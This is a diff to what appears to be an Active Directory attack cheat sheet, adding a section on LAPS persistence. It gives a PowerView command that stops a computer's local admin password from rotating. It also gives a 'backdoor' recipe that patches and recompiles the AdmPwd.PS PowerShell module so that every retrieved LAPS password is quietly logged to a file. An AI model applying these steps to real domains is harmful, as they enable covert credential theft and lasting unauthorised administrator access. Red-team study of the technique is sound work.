@@ -380,3 +380,26 @@ cat cert.pfx | base64 -w 0
 ```
  
 #### Then load TGT and request TGS or access systems as this user.
+
+## LAPS
+- The password will still reset if an admin uses the Reset-AdmPwdPassword cmdlet; or if Do not allow password expiration time longer than required by policy is enabled in the LAPS GPO.
+- Must run from system
+
+### Password access
+#### Change the password expiration date into the future
+```
+Set-DomainObject -Identity <COMPUTER> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
+```
+
+### Backdoor
+- https://github.com/GreyCorbel/admpwd
+- add the following after the first line.
+- Recompile and replacet the dll ```C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\```
+```
+PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
+
+var line = $"{pi.ComputerName} : {pi.Password}";
+System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
+
+WriteObject(pi);
+```
